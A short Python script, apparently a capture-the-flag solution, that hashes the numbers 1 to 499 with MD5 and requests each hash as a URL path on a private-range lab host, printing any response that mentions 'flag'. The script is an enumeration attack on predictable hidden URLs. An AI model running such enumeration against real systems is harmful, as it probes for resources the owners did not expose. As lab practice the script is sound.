import hashlib
import requests

url = "http://10.48.154.243/"

for i in range(1,500):
    h = hashlib.md5(str(i).encode()).hexdigest()
    r = requests.get(url + h)

    if "flag" in r.text.lower():
        print("FOUND:", i, h)
